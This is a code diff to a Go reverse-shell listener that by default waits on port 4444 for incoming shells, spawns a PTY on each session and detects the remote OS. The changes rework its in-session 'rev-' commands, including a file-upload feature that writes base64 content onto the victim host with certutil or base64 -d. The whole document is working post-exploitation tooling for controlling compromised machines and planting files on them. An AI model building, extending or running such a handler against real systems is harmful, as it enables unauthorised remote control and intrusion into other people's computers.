@@ -21,16 +21,17 @@ import (
 )
 
 var ctrlCChan = make(chan os.Signal, 1)
-var backgroundCommand = "rev-bg"
-var sessionHelpCommand = "rev-help"
 var (
-	port      int  = 0
-	manualPTY bool // Flag to control PTY spawning
+	port                int  = 0
+	manualMode          bool = false // Flag to control PTY spawning
+	backgroundCommand        = "rev-bg"
+	sessionHelpCommand       = "rev-help"
+	revCommandIsRunning bool = false
 )
 
 func init() {
 	flag.IntVar(&port, "p", 4444, "Port to listen on")
-	flag.BoolVar(&manualPTY, "m", false, "Manual mode (skip automatic PTY)")
+	flag.BoolVar(&manualMode, "m", false, "Manual mode (skip automatic PTY)")
 	flag.Parse()
 }
 
@@ -129,7 +130,7 @@ func connectionThread(destPort string, clients map[int]*Socket) {
 		fmt.Println("[+] Got connection from <", con.RemoteAddr().String(), ">, Session ID:", sessionId)
 		socket := &Socket{sessionId: sessionId, con: con}
 
-		if !manualPTY {
+		if !manualMode {
 			// Create system detector
 			detector := NewSystemDetector(con)
 
@@ -230,7 +231,7 @@ func (s *Socket) copyFromConnection(src io.Reader, dst io.Writer) <-chan int {
 				break
 			}
 			// Not print to stdout if PWN_COMMAND is found
-			if strings.Contains(string(buf[0:nBytes]), PWNCommand) {
+			if strings.Contains(string(buf[0:nBytes]), PWNCommand) || revCommandIsRunning {
 				continue
 			}
 			_, err = dst.Write(buf[0:nBytes])
@@ -370,6 +371,7 @@ func (s *Socket) inSessionCommandHandler(command string, src io.Reader, dst io.W
 
 	if strings.HasPrefix(command, "rev-") {
 		fmt.Println("<---------------------------------------------------------------------")
+		revCommandIsRunning = true
 		// Split command and arguments
 		parts := strings.Fields(command)
 		cmd := parts[0]
@@ -404,7 +406,7 @@ func (s *Socket) inSessionCommandHandler(command string, src io.Reader, dst io.W
 		case uploadCommand:
 			if len(parts) < 2 {
 				fmt.Println("[-] Usage:", uploadCommand, "<file>")
-				return true
+				break
 			}
 
 			localPath := parts[1]
@@ -412,14 +414,14 @@ func (s *Socket) inSessionCommandHandler(command string, src io.Reader, dst io.W
 			fileInfo, err := os.Stat(localPath)
 			if os.IsNotExist(err) {
 				fmt.Println("[-] File does not exist:", localPath)
-				return true
+				break
 			}
 
 			// Read file content
 			fileContent, err := os.ReadFile(localPath)
 			if err != nil {
 				fmt.Println("[-] Error reading file:", err)
-				return true
+				break
 			}
 
 			// Get filename from path
@@ -448,9 +450,9 @@ func (s *Socket) inSessionCommandHandler(command string, src io.Reader, dst io.W
 			// Create upload command based on OS
 			var uploadCmd string
 			if s.osType == "Windows" {
-				uploadCmd = fmt.Sprintf("echo %s > temp.b64 && certutil -decode temp.b64 %s && del temp.b64", encodedContent, fileName)
+				uploadCmd = fmt.Sprintf("echo '%s' ; echo %s > temp.b64 && certutil -decode temp.b64 %s && del temp.b64", PWNCommand, encodedContent, fileName)
 			} else {
-				uploadCmd = fmt.Sprintf("echo %s | base64 -d > %s", encodedContent, fileName)
+				uploadCmd = fmt.Sprintf("echo '%s' ; echo %s | base64 -d > %s", PWNCommand, encodedContent, fileName)
 			}
 
 			// Show file size
@@ -459,20 +461,23 @@ func (s *Socket) inSessionCommandHandler(command string, src io.Reader, dst io.W
 
 			// Send upload command
 			if _, err := dst.Write([]byte(uploadCmd + "\n")); err != nil {
-				fmt.Println("[-] Error sending upload command:", err)
 				done <- true
-				return true
+				fmt.Println("\n[-] Error sending upload command:", err)
+			} else {
+				done <- true
+				fmt.Println("\n[+] File upload completed, waiting for command execution...")
 			}
 
-			done <- true
-
-			fmt.Println("[+] File upload completed")
-			return true
+		default:
+			revCommandIsRunning = false
 		}
 		fmt.Println("--------------------------------------------------------------------->")
 		return true
 	}
 
+	if revCommandIsRunning {
+		revCommandIsRunning = false
+	}
 	//Default
 	return false
 }
